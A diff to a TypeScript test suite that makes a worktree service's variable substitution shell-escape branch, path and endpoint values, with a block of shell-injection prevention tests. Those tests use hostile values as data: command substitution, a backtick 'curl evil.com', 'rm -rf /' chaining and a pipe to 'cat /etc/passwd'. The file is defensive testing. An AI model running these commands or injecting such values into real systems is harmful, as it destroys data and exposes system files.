@@ -709,89 +709,163 @@ describe("WorktreeLifecycleService — Resource Config", () => {
   });
 
   describe("substituteVariables", () => {
-    it("replaces {{branch}} in connect command", () => {
-      const result = service.substituteVariables("ssh deploy@{{branch}}.example.com", {
-        branch: "feature/test",
-        worktree_path: "/w",
-        worktree_name: "test",
-        project_root: "/p",
-      });
-      expect(result).toBe("ssh deploy@feature/test.example.com");
+    const origPlatform = process.platform;
+    afterEach(() => {
+      Object.defineProperty(process, "platform", { value: origPlatform });
     });
 
-    it("replaces {{worktree_path}} and {{project_root}}", () => {
+    function setPlatform(p: string) {
+      Object.defineProperty(process, "platform", { value: p });
+    }
+
+    const baseVars = { worktree_path: "/w", worktree_name: "test", project_root: "/p" };
+
+    it("shell-escapes {{branch}} on Unix (single quotes)", () => {
+      setPlatform("darwin");
+      const result = service.substituteVariables("ssh deploy@{{branch}}.example.com", {
+        ...baseVars,
+        branch: "feature/test",
+      });
+      expect(result).toBe("ssh deploy@'feature/test'.example.com");
+    });
+
+    it("shell-escapes {{branch}} on Windows (double quotes)", () => {
+      setPlatform("win32");
+      const result = service.substituteVariables("ssh deploy@{{branch}}.example.com", {
+        ...baseVars,
+        branch: "feature/test",
+      });
+      expect(result).toBe('ssh deploy@"feature/test".example.com');
+    });
+
+    it("shell-escapes {{worktree_path}} and {{project_root}}", () => {
+      setPlatform("linux");
       const result = service.substituteVariables(
         "rsync {{worktree_path}}/ remote:{{project_root}}/",
         {
+          ...baseVars,
           branch: "main",
           worktree_path: "/home/user/worktree",
-          worktree_name: "main",
           project_root: "/home/user/project",
         }
       );
-      expect(result).toBe("rsync /home/user/worktree/ remote:/home/user/project/");
+      expect(result).toBe("rsync '/home/user/worktree'/ remote:'/home/user/project'/");
     });
 
-    it("replaces {{worktree_name}} placeholder", () => {
+    it("shell-escapes {{worktree_name}} placeholder", () => {
+      setPlatform("darwin");
       const result = service.substituteVariables("docker exec -it {{worktree_name}} bash", {
+        ...baseVars,
         branch: "feat/x",
-        worktree_path: "/w",
         worktree_name: "feat-x",
-        project_root: "/p",
       });
-      expect(result).toBe("docker exec -it feat-x bash");
+      expect(result).toBe("docker exec -it 'feat-x' bash");
     });
 
-    it("replaces {{endpoint}} when endpoint variable is provided", () => {
+    it("shell-escapes {{endpoint}} when provided", () => {
+      setPlatform("darwin");
       const result = service.substituteVariables("ssh root@{{endpoint}}", {
-        worktree_path: "/w",
-        worktree_name: "test",
-        project_root: "/p",
+        ...baseVars,
         endpoint: "10.0.0.42",
       });
-      expect(result).toBe("ssh root@10.0.0.42");
+      expect(result).toBe("ssh root@'10.0.0.42'");
     });
 
     it("leaves unresolved variables as-is (fails loudly in shell)", () => {
-      const result = service.substituteVariables("ssh root@{{unknown_var}}", {
-        worktree_path: "/w",
-        worktree_name: "test",
-        project_root: "/p",
-      });
+      const result = service.substituteVariables("ssh root@{{unknown_var}}", baseVars);
       expect(result).toBe("ssh root@{{unknown_var}}");
     });
 
-    it("replaces multiple variables in one command", () => {
+    it("replaces multiple variables with escaping", () => {
+      setPlatform("linux");
       const result = service.substituteVariables(
         "deploy --branch={{branch}} --dir={{worktree_path}} --name={{worktree_name}}",
-        {
-          branch: "main",
-          worktree_path: "/w/main",
-          worktree_name: "main",
-          project_root: "/p",
-        }
+        { ...baseVars, branch: "main", worktree_path: "/w/main", worktree_name: "main" }
       );
-      expect(result).toBe("deploy --branch=main --dir=/w/main --name=main");
+      expect(result).toBe("deploy --branch='main' --dir='/w/main' --name='main'");
     });
 
     it("is case-insensitive for variable names", () => {
+      setPlatform("darwin");
       const result = service.substituteVariables("echo {{BRANCH}} {{Worktree_Path}}", {
+        ...baseVars,
         branch: "dev",
-        worktree_path: "/w",
-        worktree_name: "dev",
-        project_root: "/p",
       });
-      expect(result).toBe("echo dev /w");
+      expect(result).toBe("echo 'dev' '/w'");
     });
 
     it("handles command with no placeholders", () => {
       const result = service.substituteVariables("docker compose up -d", {
+        ...baseVars,
         branch: "main",
-        worktree_path: "/w",
-        worktree_name: "main",
-        project_root: "/p",
       });
       expect(result).toBe("docker compose up -d");
+    });
+
+    it("leaves {branch-slug} unquoted (already sanitized to [a-z0-9-])", () => {
+      setPlatform("darwin");
+      const result = service.substituteVariables("deploy {branch-slug}", {
+        ...baseVars,
+        branch: "feature/test",
+        "branch-slug": "feature-test",
+      });
+      expect(result).toBe("deploy feature-test");
+    });
+
+    describe("shell injection prevention", () => {
+      it("neutralizes $(command) in branch names on Unix", () => {
+        setPlatform("darwin");
+        const result = service.substituteVariables("echo {{branch}}", {
+          ...baseVars,
+          branch: "feat/$(whoami)",
+        });
+        expect(result).toBe("echo 'feat/$(whoami)'");
+      });
+
+      it("neutralizes backtick injection on Unix", () => {
+        setPlatform("linux");
+        const result = service.substituteVariables("ssh root@{{endpoint}}", {
+          ...baseVars,
+          endpoint: "host`curl evil.com`",
+        });
+        expect(result).toBe("ssh root@'host`curl evil.com`'");
+      });
+
+      it("escapes embedded single quotes on Unix", () => {
+        setPlatform("darwin");
+        const result = service.substituteVariables("echo {{branch}}", {
+          ...baseVars,
+          branch: "it's-a-branch",
+        });
+        expect(result).toBe("echo 'it'\\''s-a-branch'");
+      });
+
+      it("escapes embedded double quotes on Windows", () => {
+        setPlatform("win32");
+        const result = service.substituteVariables("echo {{branch}}", {
+          ...baseVars,
+          branch: 'say "hi"',
+        });
+        expect(result).toBe('echo "say ""hi"""');
+      });
+
+      it("neutralizes semicolon command chaining", () => {
+        setPlatform("linux");
+        const result = service.substituteVariables("deploy {{branch}}", {
+          ...baseVars,
+          branch: "main; rm -rf /",
+        });
+        expect(result).toBe("deploy 'main; rm -rf /'");
+      });
+
+      it("neutralizes pipe injection in endpoint", () => {
+        setPlatform("darwin");
+        const result = service.substituteVariables("curl {{endpoint}}", {
+          ...baseVars,
+          endpoint: "http://ok | cat /etc/passwd",
+        });
+        expect(result).toBe("curl 'http://ok | cat /etc/passwd'");
+      });
     });
   });
 
